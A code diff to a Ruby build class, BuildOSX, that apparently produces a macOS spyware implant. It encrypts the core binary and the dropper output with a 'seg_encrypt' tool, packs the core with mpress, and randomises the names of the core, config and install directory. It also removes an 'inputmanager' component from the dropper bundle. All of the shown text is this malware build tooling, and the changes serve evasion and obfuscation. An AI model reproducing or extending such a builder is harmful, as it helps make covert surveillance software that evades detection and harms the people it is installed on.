@@ -44,7 +44,9 @@ class BuildOSX < Build
         raise "Working method marker not found"
       end
     end
-    
+
+    FileUtils.cp path(params[:core]), path('core_clear')
+    CrossPlatform.exec path('seg_encrypt'), path('core_clear') + ' ' + path(params[:core])
     CrossPlatform.exec path('mpress'), "-ub " + path(params[:core])
 
   end
@@ -56,11 +58,11 @@ class BuildOSX < Build
     core_backup = scramble_name(core, 32)
     dir = scramble_name(core[0..7], 7)
     config = scramble_name(core[0] < core_backup[0] ? core : core_backup, 1)
-    inputmanager = scramble_name(config, 2)
+    #inputmanager = scramble_name(config, 2)
     #driver = scramble_name(config, 4)
     #driver64 = scramble_name(config, 16)
 
-    @scrambled = {core: core, dir: dir, config: config, inputmanager: inputmanager}
+    @scrambled = {core: core, dir: dir, config: config}
 
     # call the super which will actually do the renaming
     # starting from @outputs and @scrambled
@@ -106,13 +108,16 @@ class BuildOSX < Build
 
     CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
                                         path(@scrambled[:config])+' '+
-                                        path(@scrambled[:inputmanager])+' '+
                                         @scrambled[:dir]+' '+
                                         (@demo ? path('demo_image') : 'null') +' '+
                                         executable + ' ' +
-                                        path('output')
+                                        path('output_clear')
 
-    File.exist? path('output') || raise("output file not created by dropper")
+    File.exist? path('output_clear') || raise("output file not created by dropper")
+
+    CrossPlatform.exec path('seg_encrypt'), path('output_clear') + ' ' + path('output')
+
+    File.exist? path('output') || raise("output file not crypted by seg_encrypt")
 
     trace :debug, "Build: dropper output is: #{File.size(path('output'))} bytes"
 
